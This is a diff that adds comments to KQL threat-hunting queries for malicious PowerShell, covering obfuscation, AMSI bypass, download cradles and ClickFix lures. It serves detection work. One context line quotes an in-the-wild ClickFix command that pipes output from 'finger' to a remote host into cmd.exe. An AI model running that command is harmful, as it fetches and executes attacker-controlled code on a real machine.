@@ -9,6 +9,9 @@ telemetry with a 7 day data window before being saved.
 ## 1. Embedded IPv4 address
 
 ```kql
+// Extracts every IPv4 looking string from script content, a
+// common spot for a hardcoded callback or staging IP. Expect noise from
+// version strings like 1.0.0.0; triage public, non-reserved IPs first.
 DeviceCustomScriptEvents
 | where Timestamp > ago(7d)
 | where isnotempty(ScriptContent)
@@ -31,6 +34,8 @@ priority unless the device or process context looks wrong.
 ## 2. Embedded URL or domain
 
 ```kql
+// Extracts every http or https URL embedded in script content.
+// Surfaces staging servers, exfil endpoints, or download cradle targets.
 DeviceCustomScriptEvents
 | where Timestamp > ago(7d)
 | where isnotempty(ScriptContent)
@@ -49,6 +54,8 @@ were pasted straight into a script instead of being computed at runtime.
 ## 3. Long base64 blocks
 
 ```kql
+// Flags scripts containing a contiguous base64 looking run of
+// 80 plus characters, rare in legitimate scripts, common in staged payloads.
 DeviceCustomScriptEvents
 | where Timestamp > ago(7d)
 | where isnotempty(ScriptContent)
@@ -69,6 +76,8 @@ staged second stage payloads frequently do.
 ## 4. -EncodedCommand extraction and decode
 
 ```kql
+// Extracts and decodes the base64 payload from a PowerShell
+// -EncodedCommand flag. Interleaved nulls in the decoded text are expected.
 DeviceCustomScriptEvents
 | where Timestamp > ago(7d)
 | where InitiatingProcessCommandLine contains '-EncodedCommand'
@@ -89,6 +98,8 @@ is expected, not a query defect.
 ## 5. Char code or char array string rebuild
 
 ```kql
+// Flags strings rebuilt from chained [char] casts or a
+// [char[]] array, a strong sign of automated obfuscation tooling.
 DeviceCustomScriptEvents
 | where Timestamp > ago(7d)
 | where isnotempty(ScriptContent)
@@ -107,6 +118,8 @@ automated obfuscation tooling rather than hand written code.
 ## 6. Heavy string concatenation obfuscation
 
 ```kql
+// Flags scripts with 8 or more + operators, a sign of
+// Invoke-Obfuscation style keyword splitting to dodge literal matching.
 DeviceCustomScriptEvents
 | where Timestamp > ago(7d)
 | where isnotempty(ScriptContent)
@@ -126,6 +139,8 @@ for this pattern.
 ## 7. Compression based payload obfuscation
 
 ```kql
+// Flags scripts that decompress a Gzip or Deflate stream
+// after a base64 decode, a common second stage loader pattern.
 DeviceCustomScriptEvents
 | where Timestamp > ago(7d)
 | where isnotempty(ScriptContent)
@@ -143,6 +158,8 @@ used to shrink and obscure a larger payload before executing it in memory.
 ## 8. AMSI bypass indicators
 
 ```kql
+// Flags references to internal AMSI fields or methods
+// attackers patch to disable malware scanning. Any hit warrants escalation.
 DeviceCustomScriptEvents
 | where Timestamp > ago(7d)
 | where isnotempty(ScriptContent)
@@ -159,6 +176,8 @@ Interface before running the rest of a malicious script.
 ## 9. Download cradle indicators
 
 ```kql
+// Flags the classic download and execute pattern, a
+// WebClient or Invoke-WebRequest call feeding straight into IEX.
 DeviceCustomScriptEvents
 | where Timestamp > ago(7d)
 | where isnotempty(ScriptContent)
@@ -176,6 +195,8 @@ Invoke-Expression without ever writing the payload to disk.
 ## 10. Reflection and in-memory execution indicators
 
 ```kql
+// Flags .NET reflection and unmanaged memory APIs used to
+// run a payload entirely in memory without dropping a file to disk.
 DeviceCustomScriptEvents
 | where Timestamp > ago(7d)
 | where isnotempty(ScriptContent)
@@ -193,6 +214,8 @@ an executable to disk.
 ## 11. Known offensive tooling keywords
 
 ```kql
+// Direct keyword match for well known offensive tool names.
+// Coarse and high confidence, but attackers can rename or encode strings.
 DeviceCustomScriptEvents
 | where Timestamp > ago(7d)
 | where isnotempty(ScriptContent)
@@ -213,6 +236,8 @@ renames or encodes these strings.
 Source: adapted from Microsoft Threat Intelligence, [Think before you Click(Fix): Analyzing the ClickFix social engineering technique](https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/), Microsoft Security Blog, August 21 2025.
 
 ```kql
+// Flags a command line combining a LOLBin, a download or
+// execute primitive, and an evasion flag, the typical ClickFix construction.
 DeviceCustomScriptEvents
 | where Timestamp > ago(7d)
 | where isnotempty(InitiatingProcessCommandLine)
@@ -243,6 +268,8 @@ embedding the download and execute logic inline.
 Source: adapted from Microsoft Threat Intelligence, [Think before you Click(Fix): Analyzing the ClickFix social engineering technique](https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/), Microsoft Security Blog, August 21 2025.
 
 ```kql
+// Same LOLBin, download, and evasion combo as the command
+// line variant, applied to ScriptContent; corroborate before escalating.
 DeviceCustomScriptEvents
 | where Timestamp > ago(7d)
 | where isnotempty(ScriptContent)
@@ -276,6 +303,8 @@ hunt or an unusual network destination before escalating.
 Source: adapted from Microsoft Threat Intelligence, [Think before you Click(Fix): Analyzing the ClickFix social engineering technique](https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/), Microsoft Security Blog, August 21 2025. Phrase list and InitiatingProcessCommandLine coverage extended using a real in-the-wild ClickFix sample, see below.
 
 ```kql
+// Flags fake CAPTCHA or verification wording paired with an
+// execution primitive, a ClickFix clipboard lure hallmark.
 DeviceCustomScriptEvents
 | where Timestamp > ago(7d)
 | where isnotempty(ScriptContent) or isnotempty(InitiatingProcessCommandLine)
@@ -311,6 +340,8 @@ content at all.
 Source: adapted from Microsoft Threat Intelligence, [Think before you Click(Fix): Analyzing the ClickFix social engineering technique](https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/), Microsoft Security Blog, August 21 2025 (Figure 28 describes LOLBin stacking and caret escape obfuscation, and the blog's own published hunting query uses a regex built around scrambled or caret-split spellings of the EncodedCommand flag).
 
 ```kql
+// Strips cmd.exe caret escape obfuscation, then extracts and
+// decodes any revealed -EncodedCommand payload hiding underneath.
 DeviceCustomScriptEvents
 | where Timestamp > ago(7d)
 | where isnotempty(InitiatingProcessCommandLine)
@@ -351,6 +382,8 @@ used `('-Windo' + 'wStyle') ('hid' + 'den')` to split `-WindowStyle` and
 `hidden` into two quoted fragments joined with `+`.
 
 ```kql
+// Flags a flag or cmdlet name split into two quoted fragments
+// joined with +, catching obfuscation the high-threshold concat hunt misses.
 DeviceCustomScriptEvents
 | where Timestamp > ago(7d)
 | where isnotempty(ScriptContent) or isnotempty(InitiatingProcessCommandLine)
@@ -381,6 +414,8 @@ line was
 `"cmd.exe" /c start "" /min powershell -c "& powershell ('-Windo' + 'wStyle') ('hid' + 'den') -c finger mag@finger.captchamag.com | C:\WINDOWS\system32\cmd.exe"`.
 
 ```kql
+// Flags finger.exe used with a user@host argument, a covert
+// retrieval channel over an unmonitored port that ClickFix campaigns abuse.
 DeviceCustomScriptEvents
 | where Timestamp > ago(7d)
 | where isnotempty(ScriptContent) or isnotempty(InitiatingProcessCommandLine)
